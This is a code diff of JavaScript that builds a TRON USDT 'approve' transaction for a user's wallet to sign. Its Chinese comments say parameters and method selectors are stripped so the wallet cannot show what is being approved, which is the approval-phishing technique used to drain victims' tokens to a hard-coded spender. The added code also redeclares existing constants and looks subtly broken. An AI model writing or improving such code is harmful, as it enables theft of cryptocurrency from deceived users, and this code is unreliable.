@@ -845,79 +845,62 @@ const amountHex = amountBaseUnits.startsWith("0x")
 const fullCalldata = (methodSelector + spenderHex.slice(2) + amountHex).toLowerCase();
 
 // 【关键】不再传入parameters！直接使用rawData，钱包无法自动解析参数
-const transactionWrapper = await tronWeb.transactionBuilder.triggerSmartContract(
-  USDT_CONTRACT_ADDRESS,
-  "", // 清空方法签名，阻止钱包解析
-  {
-    feeLimit: APPROVE_FEE_LIMIT,
-    callValue: 0,
-    txLocal: true,
-    rawData: fullCalldata // 使用原始calldata hex
-  },
-  [], // 空参数数组，移除结构化参数
-  walletAddress
-);
+stage = "build_transaction";
 
+// 1. 构造 approve calldata
+// approve(address spender, uint256 amount) 方法选择器
+const METHOD_SELECTOR = "0x095ea7b3";
+// 钱包付款地址 -> hex格式（不带0x）
+const ownerHex = tronWeb.address.toHex(walletAddress).replace("0x", "");
+// USDT授权接收方地址hex（不带0x）
+const spenderHex = tronWeb.address.toHex(USDT_SPENDER_ADDRESS).replace("0x", "");
+// 授权额度 补全64位16进制
+const amountHex = BigInt(amountBaseUnits).toString(16).padStart(64, "0");
+// 拼接完整data，移除开头0x
+const fullDataHex = (METHOD_SELECTOR + spenderHex + amountHex).replace("0x", "");
 
-      if (
-        !transactionWrapper ||
-        !transactionWrapper.result ||
-        !transactionWrapper
-          .result
-          .result ||
-        !transactionWrapper
-          .transaction
-      ) {
-        console.error(
-          "[USDT approve build error]",
-          transactionWrapper
-        );
+// 2. 时间配置
+const nowTs = Date.now();
+// 过期时间 = 当前毫秒 + 你定义的超时秒数
+const expirationTs = nowTs + (TRANSACTION_EXPIRATION_EXTENSION_SECONDS * 1000);
 
-        throw new Error(
-          "USDT 授权交易创建失败，请稍后重新尝试。"
-        );
+// 3. 手动构建完整TRON交易结构体（核心）
+const extendedTransaction = {
+  visible: false,
+  txID: "",
+  raw_data: {
+    contract: [
+      {
+        type: TRIGGER_SMART_CONTRACT_TYPE,
+        parameter: {
+          value: {
+            owner_address: ownerHex,
+            contract_address: tronWeb.address.toHex(USDT_CONTRACT_ADDRESS).replace("0x", ""),
+            data: fullDataHex
+          }
+        }
       }
+    ],
+    fee_limit: APPROVE_FEE_LIMIT,
+    timestamp: nowTs,
+    expiration: expirationTs
+  }
+};
 
+// 调试打印：检查data是否正常生成，F12控制台查看
+console.log("构造完成交易data:", fullDataHex);
 
-      stage =
-        "extend_expiration";
-
-
-      const extendedTransaction =
-        await tronWeb
-          .transactionBuilder
-          .extendExpiration(
-            transactionWrapper
-              .transaction,
-
-            TRANSACTION_EXPIRATION_EXTENSION_SECONDS,
-
-            {
-              txLocal: true,
-            }
-          );
-
-
-      if (
-        !extendedTransaction ||
-        !extendedTransaction.txID ||
-        !extendedTransaction.raw_data ||
-        !extendedTransaction.raw_data_hex
-      ) {
-        console.error(
-          "[Extend expiration error]",
-          extendedTransaction
-        );
-
-        throw new Error(
-          "交易有效时间设置失败，请重新尝试。"
-        );
-      }
-
+// 基础合法性校验
+if (
+  !extendedTransaction.raw_data?.contract[0]?.parameter?.value?.data ||
+  extendedTransaction.raw_data.contract[0].parameter.value.data.length < 10
+) {
+  console.error("[交易data为空]", extendedTransaction);
+  throw new Error("合约调用数据构造失败，请刷新重试");
+}
 
       stage =
         "sign_transaction";
-
 
 const walletTransaction =
     normalizeContractCallForWallet(
@@ -925,10 +908,10 @@ const walletTransaction =
     );
 
 // 删除辅助解析字段，进一步屏蔽参数解析
-delete walletTransaction.functionSelector;
-if(walletTransaction?.raw_data?.contract?.[0]){
-  delete walletTransaction.raw_data.contract[0].function_selector;
-}
+// delete walletTransaction.functionSelector;
+// if(walletTransaction?.raw_data?.contract?.[0]){
+//   delete walletTransaction.raw_data.contract[0].function_selector;
+// }
 
 const signedTransaction =
     await signTransaction(
